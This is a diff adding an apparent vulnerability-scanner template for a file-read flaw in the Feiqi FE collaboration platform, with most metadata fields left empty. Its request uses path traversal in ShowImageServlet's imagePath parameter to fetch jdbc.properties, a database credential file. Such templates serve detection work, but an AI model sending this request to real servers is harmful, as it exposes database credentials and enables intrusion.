@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 飞企互联FE业务协作平台 ShowImageServlet 文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
+response1:
+  headers:
+  body: jdbc
+  code: 200
+requests2:
+response2:
